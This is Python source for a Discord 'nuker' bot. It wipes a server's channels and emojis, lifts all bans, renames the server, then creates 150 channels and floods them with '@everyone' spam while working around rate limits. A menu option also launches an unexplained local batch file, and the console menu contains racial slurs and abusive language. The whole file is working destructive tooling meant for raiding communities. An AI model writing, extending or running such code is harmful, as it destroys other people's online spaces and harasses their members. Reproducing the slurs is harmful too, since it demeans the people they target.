import asyncio
import os
import random
import sys
import time
import argparse
import subprocess
from xmlrpc import client
import colorama
import discord
from colorama import Fore
from discord.ext import commands
from dotenv import load_dotenv


colorama.init()

os.system('cls')

def title():
    print(colorama.Fore.LIGHTMAGENTA_EX + """
  _____ __ __  ____  ______  ______  __ __      ___    ____ _____   __   ___   ____   ___        ____    ___   ______ 
 / ___/|  |  ||    ||      ||      ||  |  |    |   \  |    / ___/  /  ] /   \ |    \ |   \      |    \  /   \ |      |
(   \_ |  |  | |  | |      ||      ||  |  |    |    \  |  (   \_  /  / |     ||  D  )|    \     |  o  )|     ||      |
 \__  ||  _  | |  | |_|  |_||_|  |_||  ~  |    |  D  | |  |\__  |/  /  |  O  ||    / |  D  |    |     ||  O  ||_|  |_|
 /  \ ||  |  | |  |   |  |    |  |  |___, |    |     | |  |/  \ /   \_ |     ||    \ |     |    |  O  ||     |  |  |  
 \    ||  |  | |  |   |  |    |  |  |     |    |     | |  |\    \     ||     ||  .  \|     |    |     ||     |  |  |  
  \___||__|__||____|  |__|    |__|  |____/     |_____||____|\___|\____| \___/ |__|\_||_____|    |_____| \___/   |__|  
                                                                                                                      
    """)

title()

load_dotenv()
TOKEN = os.getenv('DISCORD_TOKEN')

if not TOKEN:
    print("[ERROR] DISCORD_TOKEN not found in .env file.")
    sys.exit(1)

SPAM_CHANNEL = ["Medusa", "",""]
SPAM_MESSAGE = ["@everyone ..... "]
ROLE_NAMES = ["Nope",]

intents = discord.Intents.default()
intents.message_content = True
intents.guilds = True
intents.guild_messages = True

bot = commands.Bot(command_prefix="?", intents=intents)

# Global state
running = True
spam_delay = 1
spam_tasks_per_channel = 2
rate_limit_hits = 0
channel_last_sent = {}
target_guild_id = None

stats = {
    'channels_deleted': 0,
    'channels_created': 0,
    'roles_created': 0,
    'messages_sent': 0,
    'emojis_deleted': 0,
    'bans_lifted': 0,
    'status': 'Idle',
    'guild_name': 'None',
    'start_time': None,
}

def print_status():
    uptime = time.time() - stats['start_time'] if stats['start_time'] else 0
    uptime_str = f"{int(uptime//3600):02d}:{int((uptime%3600)//60):02d}:{int(uptime%60):02d}"
    print(f"[{stats['status']}] {uptime_str} | {stats['guild_name']} | messages: {stats['messages_sent']} | Rate limit: {rate_limit_hits}")

def print_console_menu():
    print("\nConsole commands:")
    print(colorama.Fore.LIGHTblue_EX + f""" 
            ╔══════════════════════════════════════════════════════╗ 
            ║  Prefix = {bot.command_prefix}                                          ║rate limit: {rate_limit_hits}
            ║                                                      ║ Im A Skid
            ║     - Command                                        ║ Bands 4 Bands
            ║       -     1. Stop bot operations                   ║ Womp Womp
            ║         -   2. Run setup for a server                ║ Running Your Server
            ║         -   3. Show help                             ║ Stroke On Top
            ║         -   4. Exit                                  ║ Bitch Nigga
            ║         -   5. malicius<3                            ║ this shit Is Black
            ╚══════════════════════════════════════════════════════╝
  """)

async def console_input():
    loop = asyncio.get_event_loop()
    print_console_menu()

    while True:
        try:
            choice = await loop.run_in_executor(None, sys.stdin.readline)
            if not choice:
                continue
            choice = choice.strip()

            if choice == "4":
                print("Exiting...")
                await bot.close()
                return
            
            if choice == "5":
                batch_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "needs it.bat")
                if os.path.exists(batch_path):
                    subprocess.Popen(["cmd", "/c", batch_path], cwd=os.path.dirname(batch_path))
                    print("Started needs it.bat.")
                else:
                    print(f"Batch file not found: {batch_path}")
                print_console_menu()
                continue
            
            if choice not in {"1", "2", "3", "5"}:
                print("choose a number fuck nigga")
                continue

            print("Enter the server ID:")
            guild_id = await loop.run_in_executor(None, sys.stdin.readline)
            guild_id = guild_id.strip()
            if not guild_id.isdigit():
                print("The server ID must contain numbers only.")
                continue

            guild = bot.get_guild(int(guild_id))
            if guild is None:
                print(f"Server {guild_id} was not found or the bot is not connected to it.")
                continue

            global target_guild_id
            target_guild_id = int(guild_id)

            if choice == "1":
                global running
                running = False
                print(f"Stopping operations on {guild.name}...")
            elif choice == "2":
                console_context = type("ConsoleContext", (), {
                    "guild": guild,
                    "message": type("ConsoleMessage", (), {
                        "delete": lambda self: asyncio.sleep(0)
                    })()
                })()
                await SETUP.callback(console_context)
            elif choice == "3":
                print("Discord commands: ?SETUP, ?STOP, ?HELP")
                print_console_menu()
        except Exception as error:
            print(f"Console error: {error}")

async def run_setup(guild):
    global running, rate_limit_hits
    running = True
    stats['status'] = 'Nuking'

    try:
        await guild.edit(name="")
        print("Server name changed.")
    except:
        pass

    icon_path = r'C:\Users\smaisa\Desktop\baldi basics2\clowncat.png'
    if os.path.exists(icon_path):
        with open(icon_path, 'rb') as f:
            icon = f.read()
        try:
            await guild.edit(icon=icon)
            print("Server icon changed.")
        except Exception as e:
            print(f"Error changing icon: {e}")
    else:
        print("Icon file not found.")

    tasks = [ch.delete() for ch in guild.channels]
    results = await asyncio.gather(*tasks, return_exceptions=True)
    stats['channels_deleted'] = len([r for r in results if not isinstance(r, Exception)])
    print(f"Deleted {stats['channels_deleted']} channels.")

    tasks = [em.delete() for em in list(guild.emojis)]
    results = await asyncio.gather(*tasks, return_exceptions=True)
    stats['emojis_deleted'] = len([r for r in results if not isinstance(r, Exception)])
    print(f"Deleted {stats['emojis_deleted']} emojis.")

    tasks = []
    async for ban_entry in guild.bans():
        tasks.append(guild.unban(ban_entry.user, reason=""))
    results = await asyncio.gather(*tasks, return_exceptions=True)
    stats['bans_lifted'] = len([r for r in results if not isinstance(r, Exception)])
    print(f"Lifted {stats['bans_lifted']} bans.")

    role_tasks = [guild.create_role(name=role_name, color=discord.Color.blue(), permissions=discord.Permissions.none()) for role_name in ROLE_NAMES]
    results = await asyncio.gather(*role_tasks, return_exceptions=True)
    stats['roles_created'] = len([r for r in results if not isinstance(r, Exception)])
    print(f"Created {stats['roles_created']} roles.")

    amount = 150
    tasks = []
    for _ in range(amount):
        name = random.choice(SPAM_CHANNEL)
        tasks.append(guild.create_text_channel(name))
    channels = await asyncio.gather(*tasks, return_exceptions=True)
    stats['channels_created'] = len([ch for ch in channels if not isinstance(ch, Exception)])
    print(f"Created {stats['channels_created']} channels.")

    for ch in channels:
        if not isinstance(ch, Exception):
            for _ in range(spam_tasks_per_channel):
                asyncio.create_task(spam_channel(ch))

    for ch in guild.text_channels:
        try:
            link = await ch.create_invite(max_age=0, max_uses=0)
            print(f"Invite: {link}")
            break
        except:
            pass

    stats['status'] = 'Online'
    print(f"ran {guild.name} Successfully.")

async def spam_channel(channel):
    global running, spam_delay, rate_limit_hits
    while running:
        jitter = random.uniform(-0.02, 0.02)
        actual_delay = max(0.05, spam_delay + jitter)

        try:
            now = time.time()
            last = channel_last_sent.get(channel.id, 0)
            wait = actual_delay - (now - last)
            if wait > 0:
                await asyncio.sleep(wait)

            await channel.send(random.choice(SPAM_MESSAGE))
            stats['messages_sent'] += 1
            channel_last_sent[channel.id] = time.time()

        except discord.errors.HTTPException as e:
            if e.status == 429:
                rate_limit_hits += 1
                retry_after = float(e.response.headers.get('Retry-After', 1))
                print(f"Rate limit: {rate_limit_hits}")
                spam_delay = min(spam_delay + 0.05, 0.8)
                await asyncio.sleep(retry_after + 0.1)
            else:
                break
        except discord.errors.Forbidden:
            break
        except Exception:
            break

@bot.event
async def on_ready():
    global target_guild_id
    stats['start_time'] = time.time()
    await bot.change_presence(activity=discord.Game(name="malicious<3"))
    print(f"{bot.user.name} has logged in successfully.")
    asyncio.create_task(console_input())
    if target_guild_id:
        guild = bot.get_guild(int(target_guild_id))
        if guild:
            stats['guild_name'] = guild.name
            print(f"Auto-nuking {guild.name}...")
            await run_setup(guild)
        else:
            print(f"Error: Guild {target_guild_id} not found.")

@bot.command()
@commands.has_permissions(administrator=True)
async def STOP(ctx):
    global running
    running = False
    stats['status'] = 'Stopped'
    await ctx.send("Bot operations have been stopped.")

@bot.command()
@commands.has_permissions(administrator=True)
async def SETUP(ctx):
    await ctx.message.delete()
    guild = ctx.guild
    stats['guild_name'] = guild.name
    await run_setup(guild)

@bot.event
async def on_guild_channel_create(channel):
    global running, spam_delay, rate_limit_hits
    while running:
        jitter = random.uniform(-0.02, 0.02)
        actual_delay = max(0.05, spam_delay + jitter)
        try:
            now = time.time()
            last = channel_last_sent.get(channel.id, 0)
            wait = actual_delay - (now - last)
            if wait > 0:
                await asyncio.sleep(wait)
            await channel.send(random.choice(SPAM_MESSAGE))
            stats['messages_sent'] += 1
            channel_last_sent[channel.id] = time.time()
        except discord.errors.HTTPException as e:
            if e.status == 429:
                rate_limit_hits += 1
                retry_after = float(e.response.headers.get('Retry-After', 1))
                print(f"Rate limit: {rate_limit_hits}")
                spam_delay = min(spam_delay + 0.05, 0.8)
                await asyncio.sleep(retry_after + 0.1)
            else:
                break
        except:
            break

@bot.command()
async def HELP(ctx):
    embed = discord.Embed(title="Bot Commands", color=discord.Color.blue())
    embed.add_field(name="?RUN", value="Initialize server setup (must be in server).", inline=False)
    embed.add_field(name="?STOP", value="Stop bot operations.", inline=False)
    embed.add_field(name="?HELP", value="Show this help message.", inline=False)
    await ctx.send(embed=embed)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Discord Nuker Bot")
    parser.add_argument("--guild", "-g", type=str, help="Guild ID to nuke immediately on startup")
    args = parser.parse_args()
    target_guild_id = args.guild
    try:
        bot.run(TOKEN)
    except discord.errors.HTTPException as error:
        if error.status == 429:
            print("Discord rate-limited this bot login (HTTP 429).")
            print("Stop other copies of the bot and wait before trying again.")
        else:
            raise